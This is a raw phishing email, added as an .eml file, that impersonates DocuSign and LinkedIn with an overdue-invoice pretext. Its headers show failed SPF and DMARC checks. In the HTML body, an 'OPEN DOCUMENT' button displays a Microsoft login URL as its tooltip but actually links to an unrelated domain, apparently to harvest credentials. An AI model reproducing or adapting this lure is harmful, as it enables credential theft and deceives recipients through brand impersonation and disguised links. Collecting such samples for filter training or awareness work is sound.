@@ -1,0 +1,137 @@
+Return-Path: <dse@docusign.com>
+Received: from host-41-128-0-142.static.link.com.eg ([41.128.0.142])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id d696jqsjh0ssdgec1odgfgsu7jenu1k85glrf281
+ for zingerpie@kfcreview.com;
+ Tue, 23 Jun 2026 20:57:03 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of docusign.com does not designate 41.128.0.142 as permitted sender) client-ip=41.128.0.142; envelope-from=dse@docusign.com; helo=host-41-128-0-142.static.link.com.eg;
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of docusign.com does not designate 41.128.0.142 as permitted sender) client-ip=41.128.0.142; envelope-from=dse@docusign.com; helo=host-41-128-0-142.static.link.com.eg;
+ dmarc=fail header.from=docusign.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFV3JDbVVveTUxOFJsdnBielkxZmplT01EYnlVV09WcExScDFTTExkWG40RFNEYzZqRVFxM2hTMitXL2I3d3VCNU5aZm1aS0E2U3Ava2ZkeUNhbW0zLzNxR21IQmNuQ3o5aFc5NllsUTJBNzBlaVpra2gwZUhzSC9iaXU2SFp4OEdrMDNtQVlHSmVTRjlQVlZNNEpXb1JEQ0ZkTG1DUzZlMFU0ZjdKcm82d3VCcHltLzh5QmNkWlFvb3pQaWxFUy8wajZkcURuSGVheUdnU0hSNDBENHFPLzVVTTE0UnVkVU1rYmR6dGJzNnNDM3gvM1M3d3JTVXpBTi9uWXRZelpSMzd3UGtXb2tsY0dRNW9xT1JkNXo3WTk3ZGF1Z1phdWk0K0tPUlBYK2Q4c1lWUmlpMm5WMkJxalh5S1JDYWtFeVE9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=BGJXTEXCBpI0VMJzAX8K1oq7aiZNvaa/afO8S7ayERDi9m99FKLOSxP0n0sFatLERECIjUmSvUYl2KLDbzzmv8csJ4oVnwcSaYX/V58/GcmSyq7i4b4R0/ZS1lYOF2GAjVYr4paJVgpD8Sy2ZHgdh9vZUe11JtwWXQjw28q1MsI=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1782248224; v=1; bh=3aDfglYpSDfb5rrlKXHECNHEJYblU2ONcawlW90xkgI=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Docusign via Docusign" <dse@docusign.com>
+To: zingerpie@kfcreview.com
+Subject: AFP Plato Settlement  #10112254646 - zingerpie@kfcreview.com
+Date: 23 Jun 2026 23:57:02 +0300
+Message-ID: <20260623235702.3A22C53E53C0EF3E@docusign.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_B8EB3C02.11772732"
+
+
+------=_NextPart_000_0012_B8EB3C02.11772732
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hi Team,
+
+I hope you=E2=80=99re doing well. I=E2=80=99m writing to request an update =
+on=20
+Invoice  #10112254646, which became overdue on 26 February 2026.=20
+Our accounts team has advised that no confirmation has been=20
+received to date.
+
+Please see the attached invoice for ease of reference. Could you=20
+let us know when this will be attended to?
+
+Thank you for your cooperation, and I look forward to your reply.
+
+
+
+Regards,
+=20
+Sherry Brooks
+Accounts Manager
+LinkedIn Corporation
+www.linkedin.com
+------=_NextPart_000_0012_B8EB3C02.11772732
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; width: 855px; color: rgb(36, 36, 36); text-transform: none; tex=
+t-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-=
+serif; font-size: 15px; font-style: normal; font-weight: 400; word-spacing:=
+ 0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2;=
+ font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: i=
+nherit; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial; font-variant-numeric: inherit; fon=
+t-variant-east-asian: inherit; font-variant-alternates: inherit; font-kerni=
+ng: inherit;">
+<table cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"background: rgb(244, 244, 244); margin: 10px; padding: 20px; w=
+idth: 700px;">
+<p><span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; bord=
+er-image: none; vertical-align: baseline;">DocuSign</span></p>
+<div align=3D"center" style=3D"background: rgb(27, 68, 168); margin: 0px; p=
+adding: 20px; border: 0px currentColor; border-image: none; color: rgb(255,=
+ 255, 255); vertical-align: baseline;"><br><span style=3D"margin: 0px; padd=
+ing: 0px; border: 0px currentColor; border-image: none; font-family: inheri=
+t; font-size: large; vertical-align: baseline; font-size-adjust: inherit; f=
+ont-stretch: inherit; font-feature-settings: inherit; font-kerning: inherit=
+;"><a style=3D"color: rgb(17, 85, 204);" target=3D"_blank">
+<font color=3D"#ffffff">
+zingerpie@kfcreview.com</font></a>&nbsp;-<span>&nbsp;</span>Your secured it=
+em is prepared.</span>
+<p aria-hidden=3D"true">&nbsp;</p>
+<a=20
+title=3D"https://linkprotect.cudasvc.com/url?a=3Dhttps%3A%2F%2Flogin.micros=
+oftonline.com%2Fcommon%2Foauth2%2Fv2.0%2Fauthorize%3Fclient_id%3D65bf9831-9=
+2f0-4226-aa04-cbebe93a3cde%26response_type%3Dcode%26response_mode%3Dquery%2=
+6scope%3Dopenid%2Bprofile%2Bemail%2Bhttps%253A%252F%252Fgraph.microsoft.com=
+%252FUser.Read%26prompt%3Dnone%26state%3DiRDWZxqwqg_MQGe0BSolqg-C3bU2dRt9Lj=
+jKIqTSIAJBZiJF8n-SV8B1IJphPvmIQZN5jqfmFxLdp2Q00jTjLBer&amp;c=3DE,1,3wkXSes5=
+-y9gxHLQ-OJF-gYMBBEfeVDk3rlF1MKpG_nBYLVPMtLV_4nuvirS-kTd
+&#10;SHxzwcDC1aVb-npzvsWprgckrixz49diaO_E4B_V0rz8QZIi_EkRzbNo8w,,&amp;typo=
+=3D0" id=3D"m_-5179720543329520219gmail-anchor-02dc6490-62ff-886e-2961-4019=
+2649f924" style=3D"margin: 0px; padding: 10px; border-radius: 2px; border: =
+1px solid rgb(255, 255, 255); border-image: none; color: rgb(255, 255, 255)=
+; text-decoration: none; vertical-align: baseline;" href=3D"https://authore=
+hsanbayat.com/SOft" target=3D"_blank" rel=3D"noopener noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://linkprotect.=
+cudasvc.com/url?a%3Dhttps%253A%252F%252Flogin.microsoftonline.com%252Fcommo=
+n%252Foauth2%252Fv2.0%252Fauthorize%253Fclient_id%253D65bf9831-92f0-4226-aa=
+04-cbebe93a3cde%2526response_type%253Dcode%2526response_mode%253Dquery%2526=
+scope%253Dopenid%252Bprofile%252Bemail%252Bhttps%25253A%25252F%25252Fgraph.=
+microsoft.com%25252FUser.Read%2526prompt%253Dnone%2526state%253DiRDWZxqwqg_=
+MQGe0BSolqg-C3bU2dRt9LjjKIqTSIAJBZiJF8n-SV8B1IJphPvmIQ
+&#10;ZN5jqfmFxLdp2Q00jTjLBer%26c%3DE,1,3wkXSes5-y9gxHLQ-OJF-gYMBBEfeVDk3rlF=
+1MKpG_nBYLVPMtLV_4nuvirS-kTdSHxzwcDC1aVb-npzvsWprgckrixz49diaO_E4B_V0rz8QZI=
+i_EkRzbNo8w,,%26typo%3D0&amp;source=3Dgmail&amp;ust=3D1782269943796000&amp;=
+usg=3DAOvVaw3cAmoG8ZUi0ol_p1ovHDQN">OPEN DOCUMENT</a>
+<p aria-hidden=3D"true">&nbsp;</p></div><br>
+<p style=3D"font-size: 10px;">
+Notice: This message and any attachments are intended only for the designat=
+ed recipient and may include internal company information. If you are not t=
+he intended recipient, please delete this email and notify the sender. Unau=
+thorized review, sharing, or duplication is not permitted. Electronic messa=
+ges may occasionally be delayed during transmission. Emails sent to this ad=
+dress may be stored in accordance with company policy and applicable standa=
+rds. Please confirm all links and review=20
+attachments carefully before opening.</p>
+<p aria-hidden=3D"true">&nbsp;</p></td></tr></tbody></table></div>
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(36, 36, 36); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; vertical=
+-align: baseline; white-space: normal; orphans: 2; widows: 2; font-size-adj=
+ust: inherit; font-stretch: inherit; font-feature-settings: inherit; backgr=
+ound-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial; font-variant-numeric: inherit; fon=
+t-variant-east-asian: inherit; font-variant-alternates: inherit; font-kerni=
+ng: inherit;"></div>
+<p><br class=3D"Apple-interchange-newline">&nbsp;</p>
+</body></html>
+------=_NextPart_000_0012_B8EB3C02.11772732--
